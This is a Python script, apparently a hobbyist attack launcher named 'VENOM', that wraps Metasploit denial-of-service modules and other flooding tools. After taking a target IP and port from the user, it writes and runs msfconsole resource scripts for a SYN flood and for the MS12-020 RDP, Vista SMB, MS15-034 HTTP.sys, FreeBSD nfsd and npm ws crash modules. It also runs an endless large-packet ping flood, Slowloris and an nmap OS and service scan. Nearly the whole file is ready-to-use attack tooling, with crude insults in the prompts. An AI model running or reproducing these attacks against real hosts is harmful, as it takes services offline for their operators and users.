# -*- coding: utf-8 -*-
# DDoS tools using with msfconsole.
# ! msfconsole is just program to use exploit/payloads etc. correctly.
# NMAP + A lot of ddos tool.

import os as callmebitch
import time
import sys
def logo():    
    print("""
````    :yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy    .````
````    +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN    .````
````    +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN    .````
````    +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN    .````
````    +MMMMMMNs:/dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs//hMMMMMMN    .````
````    +MMMMMm:sNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNm/oMMMMMN    .````
````    +MMMMN.dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/oMMMMN    .````
````    +MMMM+/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm`mMMMN    .````
````    +MMMN`sMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.+MMMN    .````
````    +MMMy :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd .MMMN    .````
````    +MMM+  hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:  NMMN    .````
````    +MMM-  :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh`  hMMN    .````
````    +MMM.   +NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd.   sMMN    .````
````    +MMM`    oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN`    sMMN    .````
````    +MMM     `yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN/     oMMN    .````
````    +MMM`      hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN:      oMMN    .````
````    +MMM.      .hmmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmdo       sMMN    .````
````    +MMM/        `/MMMMMMMMMMMMMMMMMMMMMMMMMMMMd.`        mMMN    .````
````    +MMMd         +MMMMMMMMMMMMMMMMMMMMMMMMMMMMN`        :MMMN    .````
````    +MMMM+         +NdmMMMMMMMMMMMMMMMMMMMMMhNd-        `dMMMN    .````
````    +MMMMN-         :+:oMMMMMMMMMMMMMMMMMMd:+/.        .+MMMMN    .````
````    +MMMMMdo            +dMMMMMMMMMMMMMMMh.           .yNMMMMN    .````
````    +MMMMMMMy+`          :smMMMMMMMMMMNho.          -smMMMMMMN    .````
````    +MMMMMMMMMm.           `/NsMMMMdhy-           `+MMMMMMMMMN    .````
````    +MMMMMMMMMMN+.````     `-hNMMMMMmo.      ````-hMMMMMMMMMMN    .````
````    +MMMMMMMMMMMMNmmmds++osdMMMMMMMMMMNyo+++hdmmNMMMMMMMMMMMMN    .````
````    +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN    .````
````    +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN    .````
````    +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.   .````
===============================================================================
                          : V : E : N : O : M : 
                               $ B A S H
    """)
    time.sleep(4)
def slowloris():
    callmebitch.system("clear")
    callmebitch.system("figlet SLOWLORIS")
    print("""
===============================================================================
                          AUTHOR : $ B A S H
                         ====================
                           memoryhackers.org
    """)
    websiteagain = input("[*] Enter the web site name example [www.google.com] .: ")
    callmebitch.system("clear")
    callmebitch.system("perl slow.pl -dns %s"%websiteagain)
def pingsender():
    callmebitch.system("clear")
    callmebitch.system("figlet Denial Of Service")
    print("""
===============================================================================
                          AUTHOR : $ B A S H
                         ====================
                           memoryhackers.org
    """)
    selectos = input("[*] Select your OS [WINDOWS/LINUX].: ")
    if selectos == "Windows" or selectos == "WINDOWS":
        site = input("[*] Enter the web site name example [www.google.com] .: ")
        while True:
            try:
                callmebitch.system("ping -l 6000 %s"%site)
                callmebitch.system("clear")
                print("[!] Attacking..")
            except KeyboardInterrupt:
                break
    elif selectos == "Linux" or selectos == "LINUX":
        site = input("[*] Web site name example [www.google.com] .: ")
        while True:
            try:
                callmebitch.system("ping -s 6000 %s"%site)
                callmebitch.system("clear")
                print("[!] Attacking..")
            except KeyboardInterrupt:
                break
def tcpsynflood():
    callmebitch.system("clear")
    # auxiliary/dos/tcp/synflood     || TCP SYNFLOOD
    # exploit hakkında bilgi.
    callmebitch.system("figlet Denial Of Service")
    print("""
===============================================================================
                          AUTHOR : $ B A S H
                         ====================
                           memoryhackers.org
    1.) Start the attack
    2.) Info about dos.
    """)
    secim = input("[*] Make your choice.: ")
    if secim == "1":
        ip = input("[*] Enter the ip adress to start attack.: ")
        timeout = input("[*] Enter the time out (default 500).: ")
        port = input("[*] Enter the TCP flood port.: ")
        callmebitch.system("clear")    
        a = open("exploiter.txt","w")
        a.write("#This tool writed by $bash \n")
        a.write("#.:::: V E N O M ::::. \n")
        a.write("msfconsole \n")
        a.write("use auxiliary/dos/tcp/synflood\n")
        a.write("set RHOST %s \n"%ip)
        a.write("set TIMEOUT %s \n" %timeout)
        a.write("set RPORT %s \n" %port)
        a.write("clear \n")
        a.write("run")
        a.close()
        print("[!] Goob bye sir.")
        time.sleep(3)
        callmebitch.system("clear")
        callmebitch.system("msfconsole -r exploiter.txt")
    elif secim == "2":
        callmebitch.system("clear")
        print("""
        Authors;
            kris katterjohn
            
        About tool;
            A simple TCP SYN flooder
        """)
        geridon = input("[*] Press any key to turn back ~#")
        if geridon == "asd":
            tcpsynflood()
        else:
            tcpsynflood()
    else:
        print("[*] You pressed wrong..")            
###############################################################################
def ms12():
    callmebitch.system("clear")
    # auxiliary/dos/windows/rdp/ms12_020_maxchannelids  ||
    # exploit hakkında bilgi.
    callmebitch.system("figlet Denial Of Service")
    print("""
===============================================================================
                          AUTHOR : $ B A S H
                         ====================
                          memoryhackers.org
    1.) Start the attack
    2.) Info about dos.
    """)
    secim = input("[*] Make your choice.: ")
    if secim == "1":
        ip = input("[*] Enter the ip adress to start attack.: ")
        port = input("[*] Enter the target TCP port .: ")
        callmebitch.system("clear")    
        a = open("exploiter.txt","w")
        a.write("#This tool writed by $bash \n")
        a.write("#.:::: V E N O M ::::. \n")
        a.write("msfconsole \n")
        a.write("use auxiliary/dos/windows/rdp/ms12_020_maxchannelids \n")
        a.write("set RHOST %s \n"%ip)
        a.write("set RPORT %s \n"%port)
        a.write("clear \n")
        a.write("run")
        a.close()
        print("[!] Goob bye sir.")
        time.sleep(3)
        callmebitch.system("clear")
        callmebitch.system("msfconsole -r exploiter.txt")
    elif secim == "2":
        callmebitch.system("clear")
        print("""
        Authors;
            Luigi Auriemma
            Daniel Godas-Lopez
            Alex Ionescu
            <jduck [at] metasploit.com>
            
        About tool;
            This module exploits the MS12-020 RDP vulnerability 
            originally discovered and reported by Luigi Auriemma. 
            The flaw can be found in the way the T.125 ConnectMCSPDU packet is 
            handled in the maxChannelIDs field, which will result an 
            invalid pointer being used, therefore causing a 
            denial-of-service condition.
        """)
        geridon = input("[*] Press any key to turn back ~#")
        if geridon == "asd":
            ms12()
        else:
            ms12()
    else:
        print("[*] You pressed wrong..")            
###############################################################################
def nego():
    callmebitch.system("clear")
    # auxiliary/dos/windows/smb/vista_negotiate_stop  || Microsoft Vista SP0 
    #exploit hakkında bilgi.
    callmebitch.system("figlet Denial Of Service")
    print("""
===============================================================================
                          AUTHOR : $ B A S H
                         ====================
                          memoryhackers.org
    1.) Start the attack
    2.) Info about dos.
    """)
    secim = input("[*] Make your choice.: ")
    if secim == "1":
        ip = input("[*] Enter the ip adress to start attack.: ")
        port = input("[*] Enter the target TCP port.: ")
        callmebitch.system("clear")    
        a = open("exploiter.txt","w")
        a.write("#This tool writed by $bash \n")
        a.write("#.:::: V E N O M ::::. \n")
        a.write("msfconsole \n")
        a.write("use auxiliary/dos/windows/smb/vista_negotiate_stop \n")
        a.write("set RHOST %s \n"%ip)
        a.write("set RPORT %s \n"%port)
        a.write("clear \n")
        a.write("run")
        a.close()
        print("[!] Goob bye sir.")
        time.sleep(3)
        callmebitch.system("clear")
        callmebitch.system("msfconsole -r exploiter.txt")
    elif secim == "2":
        callmebitch.system("clear")
        print("""
        Authors;
            hdm <x [at] hdm.io>
            
        About tool;
            This module exploits a flaw in Windows Vista that allows a remote 
            unauthenticated attacker to disable the SMB service.
            This vulnerability was silently fixed in Microsoft Vista Service Pack 1.
        """)
        geridon = input("[*] Press any key to turn back ~#")
        if geridon == "asd":
            nego()
        else:
            nego()
    else:
        print("[*] You pressed wrong..")            
###############################################################################
def ms15():
    callmebitch.system("clear")
    # auxiliary/dos/http/ms15_034_ulonglongadd || HTTP Protocol Stack Request 
    #exploit hakkında bilgi.
    callmebitch.system("figlet Denial Of Service")
    print("""
===============================================================================
                          AUTHOR : $ B A S H
                         ====================
                          memoryhackers.org
    1.) Start the attack
    2.) Info about dos.
    """)
    secim = input("[*] Make your choice.: ")
    if secim == "1":
        ip = input("[*] Enter the ip adress to start attack.: ")
        port = input("[*] Enter the target HTTP port (default 80).: ")
        callmebitch.system("clear")    
        a = open("exploiter.txt","w")
        a.write("#This tool writed by $bash \n")
        a.write("#.:::: V E N O M ::::. \n")
        a.write("msfconsole \n")
        a.write("use auxiliary/dos/http/ms15_034_ulonglongadd \n")
        a.write("set RHOSTS %s \n"%ip)
        a.write("set RPORT %s \n"%port)
        a.write("clear \n")
        a.write("run")
        a.close()
        print("[!] Goob bye sir.")
        time.sleep(3)
        callmebitch.system("clear")
        callmebitch.system("msfconsole -r exploiter.txt")
    elif secim == "2":
        callmebitch.system("clear")
        print("""
        Authors;
            Bill Finlayson
            sinn3r <sinn3r [at] metasploit.com>
            
        About tool;
            This module will check if scanned hosts are vulnerable to 
            CVE-2015-1635 (MS15-034), a vulnerability in the HTTP protocol 
            stack (HTTP.sys) that could result in arbitrary code 
            execution. This module will try to cause a denial-of-service.0.
        """)
        geridon = input("[*] Press any key to turn back ~#")
        if geridon == "asd":
            ms15()
        else:
            ms15()
    else:
        print("[*] You pressed wrong..")            
###############################################################################
def nfsd():
    callmebitch.system("clear")
    # auxiliary/dos/freebsd/nfsd/nfsd_mount 
    #exploit hakkında bilgi.
    callmebitch.system("figlet Denial Of Service")
    print("""
===============================================================================
                          AUTHOR : $ B A S H
                         ====================
                          memoryhackers.org
    1.) Start the attack
    2.) Info about dos.
    """)
    secim = input("[*] Make your choice.: ")
    if secim == "1":
        ip = input("[*] Enter the ip adress to start attack.: ")
        port = input("[*] Enter the target HTTP port (default 80).: ")
        callmebitch.system("clear")    
        a = open("exploiter.txt","w")
        a.write("#This tool writed by $bash \n")
        a.write("#.:::: V E N O M ::::. \n")
        a.write("msfconsole \n")
        a.write("use auxiliary/dos/freebsd/nfsd/nfsd_mount \n")
        a.write("set RHOST %s \n"%ip)
        a.write("set RPORT %s \n"%port)
        a.write("clear \n")
        a.write("run")
        a.close()
        print("[!] Goob bye sir.")
        time.sleep(3)
        callmebitch.system("clear")
        callmebitch.system("msfconsole -r exploiter.txt")   
    elif secim == "2":
        callmebitch.system("clear")
        print("""
        Authors;
            MC <mc [at] metasploit.com>
            
        About tool;
            This module sends a specially-crafted NFS Mount request 
            causing a kernel panic on host running FreeBSD 6.0.
        """)
        geridon = input("[*] Press any key to turn back ~#")
        if geridon == "asd":
            nfsd()
        else:
            nfsd()
    else:
        print("[*] You pressed wrong..")
        
###############################################################################
def wsdos():
    # auxiliary/dos/http/ws_dos
    #exploit hakkında bilgi.
    callmebitch.system("clear")
    callmebitch.system("figlet Denial Of Service")
    print("""
===============================================================================
                          AUTHOR : $ B A S H
                         ====================
                           memoryhackers.org
    1.) Start the attack
    2.) Info about dos.
    
    """)
    secim = input("[*] Make your choice.: ")
    if secim == "1":
        callmebitch.system("clear")
        callmebitch.system("figlet ATTACK")
        ip = input("[*] Enter the ip adress to start attack.: ")
        port = input("[*] Enter the target HTTP port (default 80).: ")
        callmebitch.system("clear")    
        a = open("exploiter.txt","w")
        a.write("#This tool writed by $bash \n")
        a.write("#.:::: V E N O M ::::. \n")
        a.write("msfconsole \n")
        a.write("use auxiliary/dos/http/ws_dos \n")
        a.write("set RHOST %s \n"%ip)
        a.write("set RPORT %s \n"%port)
        a.write("clear \n")
        a.write("run")
        a.close()
        print("[!] Goob bye sir.")
        time.sleep(3)
        callmebitch.system("clear")
        callmebitch.system("msfconsole -r exploiter.txt")
    elif secim == "2":
        callmebitch.system("clear")
        print("""
        Authors;
            Ryan Knell, Sonatype Security Research
            Nick Starke, Sonatype Security Research
        
        About tool;
            This module exploits a Denial of Service vulnerability in 
            npm module "ws".By sending a specially crafted value of the 
            Sec-WebSocket-Extensions header on the initial 
            WebSocket upgrade request, the ws component will crash.
        """)
        geridon = input("[*] Press any key to turn back ~#")
        if geridon == "asd":
            wsdos()
        else:
            wsdos()
    else:
        print("[*] You pressed wrong..")
###############################################################################
callmebitch.system("clear")
print("[-] Warning; The user is responsible for the transaction. ")
wehaveadeal=input("[*] Press [Y] to accept responsible and start program.:")
if wehaveadeal == "Y" or wehaveadeal == "y":
    callmebitch.system("apt-get update")
    callmebitch.system("apt-get update msfconsole")
    callmebitch.system("apt-get install figlet")
    callmebitch.system("clear")
    logo()
    callmebitch.system("clear")
    print("""
 ██▒   █▓   ▓█████     ███▄    █     ▒█████      ███▄ ▄███▓
▓██░   █▒   ▓█   ▀     ██ ▀█   █    ▒██▒  ██▒   ▓██▒▀█▀ ██▒
 ▓██  █▒░   ▒███      ▓██  ▀█ ██▒   ▒██░  ██▒   ▓██    ▓██░
  ▒██ █░░   ▒▓█  ▄    ▓██▒  ▐▌██▒   ▒██   ██░   ▒██    ▒██ 
   ▒▀█░     ░▒████▒   ▒██░   ▓██░   ░ ████▓▒░   ▒██▒   ░██▒
   ░ ▐░     ░░ ▒░ ░   ░ ▒░   ▒ ▒    ░ ▒░▒░▒░    ░ ▒░   ░  ░
   ░ ░░      ░ ░  ░   ░ ░░   ░ ▒░     ░ ▒ ▒░    ░  ░      ░
     ░░        ░         ░   ░ ░    ░ ░ ░ ▒     ░      ░   
      ░        ░  ░            ░        ░ ░            ░   
     ░                                                               
|~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~| 
                    instagram; yigitaydn.py
                       memoryhackers.org
    1-) DDoS Attack Screen
    2-) Scanner Screen
|~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~| 
    """)
    okey = input("[*] Make your choice.: ")
    if okey == "1":
        callmebitch.system("clear")
        print("""
 ██▒   █▓   ▓█████     ███▄    █     ▒█████      ███▄ ▄███▓
▓██░   █▒   ▓█   ▀     ██ ▀█   █    ▒██▒  ██▒   ▓██▒▀█▀ ██▒
 ▓██  █▒░   ▒███      ▓██  ▀█ ██▒   ▒██░  ██▒   ▓██    ▓██░
  ▒██ █░░   ▒▓█  ▄    ▓██▒  ▐▌██▒   ▒██   ██░   ▒██    ▒██ 
   ▒▀█░     ░▒████▒   ▒██░   ▓██░   ░ ████▓▒░   ▒██▒   ░██▒
   ░ ▐░     ░░ ▒░ ░   ░ ▒░   ▒ ▒    ░ ▒░▒░▒░    ░ ▒░   ░  ░
   ░ ░░      ░ ░  ░   ░ ░░   ░ ▒░     ░ ▒ ▒░    ░  ░      ░
     ░░        ░         ░   ░ ░    ░ ░ ░ ▒     ░      ░   
      ░        ░  ░            ░        ░ ░            ░   
     ░                                                               
|~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~| 
                    instagram; yigitaydn.py
                        memoryhackers.org
              D E N I A L    O F    S E R V I C E
    1-) TCP SYN Flooder
    2-) Microsoft Remote Desktop Use-After-Free DoS
    3-) Microsoft Vista SMB Negotiate Protocol DoS
    4-) HTTP Protocol Stack Request DoS
    5-) FreeBSD NFS RPC Request Denial of Service
    6-) Denial Of Service Tool
    7-) High packet size ping sender
    8-) SlowLoris Attack
        
|~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~| 
    """)
        ddos = input("[*] Enter the choice.: ")
        if ddos == "1":
                callmebitch.system("clear")
                tcpsynflood()
        elif ddos == "2":
                callmebitch.system("clear")
                ms12()
        elif ddos == "3":
                callmebitch.system("clear")
                nego()
        elif ddos == "4":
                callmebitch.system("clear")
                ms15()
        elif ddos == "5":
                callmebitch.system("clear")
                nfsd()
        elif ddos == "6":
                callmebitch.system("clear")
                wsdos()
        elif ddos == "7":
                callmebitch.system("clear")
                pingsender()
        elif ddos == "8":
                callmebitch.system("clear")
                slowloris()
    elif okey == "2":
        callmebitch.system("clear")
        print("""
 ██▒   █▓   ▓█████     ███▄    █     ▒█████      ███▄ ▄███▓
▓██░   █▒   ▓█   ▀     ██ ▀█   █    ▒██▒  ██▒   ▓██▒▀█▀ ██▒
 ▓██  █▒░   ▒███      ▓██  ▀█ ██▒   ▒██░  ██▒   ▓██    ▓██░
  ▒██ █░░   ▒▓█  ▄    ▓██▒  ▐▌██▒   ▒██   ██░   ▒██    ▒██ 
   ▒▀█░     ░▒████▒   ▒██░   ▓██░   ░ ████▓▒░   ▒██▒   ░██▒
   ░ ▐░     ░░ ▒░ ░   ░ ▒░   ▒ ▒    ░ ▒░▒░▒░    ░ ▒░   ░  ░
   ░ ░░      ░ ░  ░   ░ ░░   ░ ▒░     ░ ▒ ▒░    ░  ░      ░
     ░░        ░         ░   ░ ░    ░ ░ ░ ▒     ░      ░   
      ░        ░  ░            ░        ░ ░            ░   
     ░                                                               
|~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~| 
                    instagram; yigitaydn.py
                         S C A N N E R
                       memoryhackers.org
|~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~ ------- ~| 
    """) 
        scanner = input("[*] Enter IP or Website Name.: ")
        callmebitch.system("nmap -sS -sV -O %s"%scanner)
    else:
        print("[*] You pressed wrong..")
    
    
elif wehaveadeal == "N" or wehaveadeal == "n":
    callmebitch.system("clear")
    print("[exit] Good bye. P*ssy")
    time.sleep(4)
    sys.exit()
    
#We have a deal ?
